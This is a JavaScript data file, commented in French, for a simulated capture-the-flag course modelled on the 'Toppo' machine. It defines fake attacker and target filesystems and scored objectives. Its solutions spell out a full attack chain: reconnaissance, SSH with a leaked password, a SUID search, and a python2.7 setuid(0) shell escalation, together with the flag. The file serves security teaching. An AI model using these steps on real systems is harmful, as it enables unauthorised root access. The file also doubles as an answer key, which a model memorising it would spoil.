// sim-data-toppo.js — données du cours "Toppo"
// C'est CE fichier que tu dupliques pour créer un nouveau cours.
// Le moteur (sim-engine.js) ne connaît rien de Toppo.
//
// Structure :
//   kaliVfs   : arborescence de la machine attaquante (fausse, juste pour
//               que l'utilisateur puisse se balader au début)
//   toppoVfs  : arborescence de la cible (le vrai terrain de jeu)
//   attacker  : host de départ (Kali)
//   toppo     : host cible (ports, users, web.routes, privesc)
//   objectives: liste des objectifs "coeur" (total = 100 pts)
//   bonusObjectives: trouvailles optionnelles
//   flag      : salt + hash SHA-256
(function (global) {
  "use strict";
  const U = global.SimUtils;

  // ============================== VFS ATTAQUANT (Kali) =========================
  // Volontairement simple : sert à montrer qu'on est bien sur une machine
  // attaquante, et à contenir des notes perso / wordlists.
  const kaliVfs = U.dir({
    "root": U.dir({}, { owner: "root", perms: "rwxr-x" }),
    "home": U.dir({
      "kali": U.dir({
        "Documents": U.dir({
          "notes-pentest.txt": U.file(
            "Rappels perso :\n" +
            "- Toujours commencer par nmap -sV -sC\n" +
            "- gobuster dir -u URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n" +
            "- Ne jamais oublier les SUID : find / -perm -4000 -type f 2>/dev/null\n" +
            "- Un interpréteur SUID (python, perl, vim...) = root immédiat\n",
            { owner: "kali", perms: "rw-r--", mtime: "Sep 20 14:12" }
          )
        }, { owner: "kali", perms: "rwxr-x" }),
        "wordlists": U.dir({
          "common.txt": U.file(
            "admin\nbackup\nmail\nuploads\nnotes.txt\nflag.txt\nserver-status\n",
            { owner: "kali", perms: "rw-r--" }
          )
        }, { owner: "kali", perms: "rwxr-x" }),
        ".bash_history": U.file(
          "nmap -sV -sC 192.168.56.102\n" +
          "gobuster dir -u http://192.168.56.102 -w wordlists/common.txt\n" +
          "curl http://192.168.56.102/admin/notes.txt\n",
          { owner: "kali", perms: "rw-------" }
        )
      }, { owner: "kali", perms: "rwxr-x" })
    }, { owner: "root", perms: "rwxr-x" }),
    "etc": U.dir({
      "passwd": U.file("root:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000:kali:/home/kali:/bin/bash\n", { perms: "rw-r--" }),
      "hostname": U.file("kali\n", { perms: "rw-r--" })
    }, { perms: "rwxr-x" }),
    "tmp": U.dir({}, { perms: "rwxrwx" }),
    "usr": U.dir({
      "share": U.dir({
        "wordlists": U.dir({}, { owner: "root", perms: "rwxr-x" })
      }, { owner: "root", perms: "rwxr-x" })
    }, { owner: "root", perms: "rwxr-x" })
  }, { perms: "rwxr-x" });

  // ============================== VFS TOPPO ====================================
  // Arborescence réaliste d'une Debian 8 qui héberge un blog Apache.
  // Le SUID python2.7 est planqué dans /usr/bin : il faut le découvrir.
  const toppoVfs = (function () {
    const wwwHtml = U.dir({
      "index.html": U.file(
        "<!DOCTYPE html>\n<html><head><title>Clean Blog</title></head>\n" +
        "<body><h1>Welcome to Toppo</h1>\n" +
        "<p>Blog en construction.</p>\n" +
        "<!-- TODO: supprimer /admin/notes.txt avant mise en prod -->\n" +
        "</body></html>\n",
        { owner: "www-data", perms: "rw-r--", mtime: "Apr 15 2018" }
      ),
      "LICENSE": U.file("MIT License\n\nCopyright (c) 2018 Toppo\n", { owner: "www-data", perms: "rw-r--" }),
      "css": U.dir({
        "style.css": U.file("body{font-family:sans-serif;}\n", { owner: "www-data", perms: "rw-r--" })
      }, { owner: "www-data", perms: "rwxr-x" }),
      "js": U.dir({
        "main.js": U.file("console.log('clean blog');\n", { owner: "www-data", perms: "rw-r--" })
      }, { owner: "www-data", perms: "rwxr-x" }),
      "img": U.dir({
        "logo.png": U.file("[binary png data]", { owner: "www-data", perms: "rw-r--", filetype: "PNG image data" })
      }, { owner: "www-data", perms: "rwxr-x" }),
      "admin": U.dir({
        "index.html": U.file("<h1>Admin panel</h1>\n", { owner: "www-data", perms: "rw-r--" }),
        "notes.txt": U.file(
          "Note to myself :\n" +
          "I need to change my password :/\n" +
          "12345ted123 is too outdated but the technology isn't my thing\n" +
          "i prefer go fishing or watching soccer .\n",
          { owner: "www-data", perms: "rw-r--", mtime: "Apr 15 2018" }
        ),
        ".htaccess": U.file("Deny from all\n", { owner: "www-data", perms: "rw-r--" })
      }, { owner: "www-data", perms: "rwxr-x" }),
      "mail": U.dir({
        "index.php": U.file("<?php // webmail stub ?>\n", { owner: "www-data", perms: "rw-r--" }),
        "inbox.txt": U.file("From: admin@toppo\nSubject: mot de passe\n\nJe l'ai note dans /admin/notes.txt\n", { owner: "www-data", perms: "rw-r--" })
      }, { owner: "www-data", perms: "rwxr-x" }),
      "manual": U.dir({}, { owner: "www-data", perms: "rwxr-x" }),
      "vendor": U.dir({
        "composer.json": U.file('{"name":"toppo/blog"}\n', { owner: "www-data", perms: "rw-r--" })
      }, { owner: "www-data", perms: "rwxr-x" })
    }, { owner: "www-data", perms: "rwxr-x", mtime: "Apr 15 2018" });

    const homeTed = U.dir({
      ".bash_history": U.file(
        "ls -la\nid\nuname -a\ncat /etc/passwd\n",
        { owner: "ted", perms: "rw-------" }
      ),
      ".bashrc": U.file("# ~/.bashrc\nexport PATH=$PATH:/usr/local/bin\n", { owner: "ted", perms: "rw-r--" }),
      ".profile": U.file("# ~/.profile\n", { owner: "ted", perms: "rw-r--" }),
      "user.txt": U.file(
        "Bien joue, tu as un premier acces.\n" +
        "Maintenant, trouve le moyen de devenir root.\n",
        { owner: "ted", perms: "rw-r--", mtime: "Apr 15 2018" }
      ),
      "todo.txt": U.file(
        "- changer mot de passe (12345ted123 trop vieux)\n" +
        "- verifier ce binaire python bizarre en SUID\n",
        { owner: "ted", perms: "rw-r--" }
      )
    }, { owner: "ted", perms: "rwxr-x" });

    const homeRoot = U.dir({
      "flag.txt": U.file(
        "_________                                  \n" +
        "|  _   _  |                                 \n" +
        "|_/ | | \\_|.--.   _ .--.   _ .--.    .--.   \n" +
        "    | |  / .'`\\ \\[ '/'`\\ \\[ '/'`\\ \\/ .'`\\ \\ \n" +
        "   _| |_ | \\__. | | \\__/ | | \\__/ || \\__. | \n" +
        "  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  \n" +
        "                 [__|     [__|              \n" +
        "\n" +
        "Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}\n",
        { owner: "root", perms: "rw-------", isFlag: true, mtime: "Apr 15 2018" }
      ),
      ".bash_history": U.file(
        "passwd ted\n" +
        "chmod u+s /usr/bin/python2.7\n" +
        "exit\n",
        { owner: "root", perms: "rw-------" }
      ),
      ".bashrc": U.file("# ~/.bashrc root\n", { owner: "root", perms: "rw-r--" }),
      ".profile": U.file("# ~/.profile root\n", { owner: "root", perms: "rw-r--" })
    }, { owner: "root", perms: "rwx------" });

    return U.dir({
      "bin": U.dir({
        "bash": U.file("ELF", { owner: "root", perms: "rwxr-x", filetype: "ELF 32-bit LSB executable" }),
        "ls": U.file("ELF", { owner: "root", perms: "rwxr-x", filetype: "ELF 32-bit LSB executable" }),
        "cat": U.file("ELF", { owner: "root", perms: "rwxr-x", filetype: "ELF 32-bit LSB executable" }),
        "su": U.suidNode("ELF", { perms: "rwsr-x", mtime: "Sep 26 2014" }),
        "mount": U.suidNode("ELF", { perms: "rwsr-x", mtime: "Sep 26 2014" }),
        "umount": U.suidNode("ELF", { perms: "rwsr-x", mtime: "Sep 26 2014" })
      }, { owner: "root", perms: "rwxr-x" }),
      "sbin": U.dir({
        "mount.nfs": U.suidNode("ELF", { perms: "rwsr-x" }),
        "ifconfig": U.file("ELF", { owner: "root", perms: "rwxr-x" })
      }, { owner: "root", perms: "rwxr-x" }),
      "etc": U.dir({
        "passwd": U.file(
          "root:x:0:0:root:/root:/bin/bash\n" +
          "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n" +
          "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n" +
          "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n" +
          "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n" +
          "ted:x:1000:1000:ted,,,:/home/ted:/bin/bash\n",
          { owner: "root", perms: "rw-r--" }
        ),
        "shadow": U.file(
          "root:*:17640:0:99999:7:::\n" +
          "ted:$6$rounds=5000$abcdefgh$xyz...:17640:0:99999:7:::\n",
          { owner: "root", perms: "rw-------" }
        ),
        "issue": U.file("Debian GNU/Linux 8 \\n \\l\n", { owner: "root", perms: "rw-r--" }),
        "hostname": U.file("Toppo\n", { owner: "root", perms: "rw-r--" }),
        "crontab": U.file(
          "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n" +
          "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n" +
          "25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n",
          { owner: "root", perms: "rw-r--" }
        ),
        "cron.d": U.dir({
          "anacron": U.file("SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n", { owner: "root", perms: "rw-r--" }),
          "php5": U.file("# php5 cron\n", { owner: "root", perms: "rw-r--" })
        }, { owner: "root", perms: "rwxr-x" }),
        "cron.daily": U.dir({
          "apt": U.file("#!/bin/sh\n# apt daily\n", { owner: "root", perms: "rwxr-x", filetype: "POSIX shell script" }),
          "logrotate": U.file("#!/bin/sh\n# logrotate daily\n", { owner: "root", perms: "rwxr-x", filetype: "POSIX shell script" })
        }, { owner: "root", perms: "rwxr-x" })
      }, { owner: "root", perms: "rwxr-x" }),
      "home": U.dir({
        "ted": homeTed
      }, { owner: "root", perms: "rwxr-x" }),
      "root": homeRoot,
      "usr": U.dir({
        "bin": U.dir({
          "python2.7": U.suidNode(
            "ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked\n",
            { perms: "rwsrwxrwx", mtime: "Aug 13  2016", filetype: "ELF 32-bit LSB executable" }
          ),
          "gpasswd": U.suidNode("ELF", { perms: "rwsr-x" }),
          "newgrp": U.suidNode("ELF", { perms: "rwsr-x" }),
          "chsh": U.suidNode("ELF", { perms: "rwsr-x" }),
          "chfn": U.suidNode("ELF", { perms: "rwsr-x" }),
          "at": U.suidNode("ELF", { perms: "rwsr-x" }),
          "mawk": U.suidNode("ELF", { perms: "rwsr-x" }),
          "procmail": U.suidNode("ELF", { perms: "rwsr-x" }),
          "passwd": U.suidNode("ELF", { perms: "rwsr-x" }),
          "vi": U.file("ELF", { owner: "root", perms: "rwxr-x" }),
          "nano": U.file("ELF", { owner: "root", perms: "rwxr-x" })
        }, { owner: "root", perms: "rwxr-x" }),
        "sbin": U.dir({
          "exim4": U.suidNode("ELF", { perms: "rwsr-x" })
        }, { owner: "root", perms: "rwxr-x" }),
        "lib": U.dir({
          "eject": U.dir({
            "dmcrypt-get-device": U.suidNode("ELF", { perms: "rwsr-x" })
          }, { owner: "root", perms: "rwxr-x" }),
          "dbus-1.0": U.dir({
            "dbus-daemon-launch-helper": U.suidNode("ELF", { perms: "rwsr-x" })
          }, { owner: "root", perms: "rwxr-x" }),
          "openssh": U.dir({
            "ssh-keysign": U.suidNode("ELF", { perms: "rwsr-x" })
          }, { owner: "root", perms: "rwxr-x" })
        }, { owner: "root", perms: "rwxr-x" })
      }, { owner: "root", perms: "rwxr-x" }),
      "var": U.dir({
        "www": U.dir({
          "html": wwwHtml
        }, { owner: "www-data", perms: "rwxr-x" }),
        "log": U.dir({
          "auth.log": U.file(
            "Apr 15 12:33:00 Toppo sshd[1234]: Accepted password for ted from 192.168.0.29\n",
            { owner: "root", perms: "rw-r-----" }
          ),
          "apache2": U.dir({
            "access.log": U.file(
              '192.168.0.29 - - [15/Apr/2018:12:34:01] "GET /admin/notes.txt HTTP/1.1" 200 234\n',
              { owner: "www-data", perms: "rw-r-----" }
            )
          }, { owner: "www-data", perms: "rwxr-x" })
        }, { owner: "root", perms: "rwxr-x" })
      }, { owner: "root", perms: "rwxr-x" }),
      "tmp": U.dir({}, { owner: "root", perms: "rwxrwx" }),
      "dev": U.dir({}, { owner: "root", perms: "rwxr-x" }),
      "proc": U.dir({}, { owner: "root", perms: "rwxr-x" })
    }, { owner: "root", perms: "rwxr-x" });
  })();

  // ============================== HOSTS ========================================
  const attacker = {
    id: "kali", hostname: "kali", ip: "192.168.56.101",
    user: "kali", home: "/home/kali",
    users: { kali: { home: "/home/kali", idLine: "uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo)" } },
    vfs: kaliVfs,
    uname: "Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 x86_64 GNU/Linux"
  };

  const toppo = {
    id: "toppo", hostname: "Toppo", ip: "192.168.56.102",
    ports: [
      { port: 22, service: "ssh", version: "OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)" },
      { port: 80, service: "http", version: "Apache httpd 2.4.10 ((Debian))" },
      { port: 111, service: "rpcbind", version: "2-4 (RPC #100000)" }
    ],
    osInfo: "OS: Linux; CPE: cpe:/o:linux:linux_kernel",
    fingerprint: "vJgmhqKOmHq0Mb0plSTyOdzw6GenPEkZkch+PIVozzw",
    users: {
      ted: {
        home: "/home/ted",
        password: "12345ted123",
        idLine: "uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)"
      }
    },
    motd: [
      "Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY.",
      "Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29"
    ],
    uname: "Linux Toppo 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux",
    noSudo: true,
    vfs: toppoVfs,
    web: {
      routes: {
        "/": { brute: false, content: "<html><head><title>Clean Blog</title></head><body><h1>Toppo</h1></body></html>" },
        "/index.html": { brute: false, content: "<html><body><h1>Toppo</h1></body></html>" },
        "/admin/": { brute: true, status: 301, redirect: "/admin/" },
        "/admin/index.html": { brute: false, content: "<h1>Admin panel</h1>" },
        "/admin/notes.txt": {
          brute: false, content:
            "Note to myself :\nI need to change my password :/\n" +
            "12345ted123 is too outdated but the technology isn't my thing\n" +
            "i prefer go fishing or watching soccer .\n"
        },
        "/mail/": { brute: true, status: 301, redirect: "/mail/" },
        "/mail/index.php": { brute: false, content: "<?php // webmail ?>" },
        "/img/": { brute: true, status: 301, redirect: "/img/" },
        "/css/": { brute: true, status: 301, redirect: "/css/" },
        "/js/": { brute: true, status: 301, redirect: "/js/" },
        "/manual/": { brute: true, status: 301, redirect: "/manual/" },
        "/vendor/": { brute: true, status: 301, redirect: "/vendor/" },
        "/LICENSE": { brute: true, status: 200, content: "MIT License" },
        "/server-status": { brute: true, status: 403 }
      }
    },
    privesc: [
      // python2.7 SUID -> shell root. Le regex doit matcher setuid(0) ET /bin/bash.
      {
        match: function (raw) {
          return /python2\.7/.test(raw) && /setuid\s*\(\s*0\s*\)/.test(raw) && /(\/bin\/bash|\/bin\/sh)/.test(raw);
        },
        to: "root",
        output: [
          { t: "root@Toppo:~# ", c: "ok" },
          { t: "uid=0(root) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)", c: "ok" }
        ]
      }
    ]
  };

  // ============================== OBJECTIFS ====================================
  const objectives = [
    {
      id: "scan", points: 10, label: "Scanner la cible avec nmap",
      check: function (s) { return s.events.has("nmap:192.168.56.102"); },
      hint: "Lance nmap -sV -sC sur l'IP de la cible.",
      solution: "nmap -sV -sC 192.168.56.102"
    },
    {
      id: "find-notes", points: 10, label: "Trouver le fichier notes.txt dans /admin/",
      check: function (s) {
        return s.events.has("read:toppo:web:/admin/notes.txt") ||
               s.events.has("read:toppo:/var/www/html/admin/notes.txt");
      },
      hint: "Après gobuster, fouille /admin/ avec curl.",
      solution: "curl http://192.168.56.102/admin/notes.txt"
    },
    {
      id: "ssh-ted", points: 20, label: "Se connecter en SSH en tant que ted",
      check: function (s) { return s.events.has("ssh:toppo:ted"); },
      hint: "Utilise les identifiants trouvés dans notes.txt.",
      solution: "ssh ted@192.168.56.102 (mot de passe : 12345ted123)"
    },
    {
      id: "read-user", points: 10, label: "Lire /home/ted/user.txt",
      check: function (s) { return s.events.has("read:toppo:/home/ted/user.txt"); },
      hint: "Une fois connecté, regarde les fichiers de ton home.",
      solution: "cat /home/ted/user.txt"
    },
    {
      id: "find-suid", points: 20, label: "Découvrir le SUID anormal (/usr/bin/python2.7)",
      check: function (s) { return s.events.has("find-suid:toppo"); },
      hint: "find / -perm -4000 -type f 2>/dev/null",
      solution: "find / -perm -4000 -type f 2>/dev/null"
    },
    {
      id: "privesc", points: 20, label: "Exploiter python2.7 SUID pour devenir root",
      check: function (s) { return s.events.has("privesc:toppo:root"); },
      hint: "Un interpréteur SUID peut forcer setuid(0) et lancer un shell.",
      solution: 'python2.7 -c \'import os; os.setuid(0); os.system("/bin/bash")\''
    },
    {
      id: "read-flag", points: 10, label: "Lire /root/flag.txt",
      check: function (s) { return s.events.has("read:toppo:/root/flag.txt"); },
      hint: "En root, cat /root/flag.txt",
      solution: "cat /root/flag.txt"
    }
  ];

  const bonusObjectives = [
    { id: "read-todo", points: 5, label: "Bonus : lire /home/ted/todo.txt",
      check: function (s) { return s.events.has("read:toppo:/home/ted/todo.txt"); } },
    { id: "read-bash-history", points: 5, label: "Bonus : lire /root/.bash_history",
      check: function (s) { return s.events.has("read:toppo:/root/.bash_history"); } },
    { id: "read-etc-passwd", points: 3, label: "Bonus : lire /etc/passwd",
      check: function (s) { return s.events.has("read:toppo:/etc/passwd"); } },
    { id: "read-crontab", points: 3, label: "Bonus : lire /etc/crontab",
      check: function (s) { return s.events.has("read:toppo:/etc/crontab"); } },
    { id: "read-logs", points: 4, label: "Bonus : lire /var/log/auth.log",
      check: function (s) { return s.events.has("read:toppo:/var/log/auth.log"); } },
    { id: "list-root", points: 5, label: "Bonus : lister /root/ en root",
      check: function (s) {
        return s.events.has("ls:toppo:/root") && s.events.has("privesc:toppo:root");
      } }
  ];

  // ============================== COURSE =======================================
  global.COURSE_TOPPO = {
    id: "lab-toppo-complete.html",
    title: "Toppo — Chaîne complète",
    attacker: attacker,
    hosts: [attacker, toppo],
    objectives: objectives,
    bonusObjectives: bonusObjectives,
    flag: {
      salt: "toppo\u00b7lab\u00b7v1\u00b7",
      // sha256("toppo·lab·v1·0wnedlab{p4ssi0n_c0me_with_pract1ce}")
      // >>> à REGÉNÉRER toi-même (voir note ci-dessous), valeur d'exemple :
      hash: "f23bcc0366e36ca091415a0d1d96216e95881ac68b39c4879df8c92ebdba2883"
    }
  };
})(window);
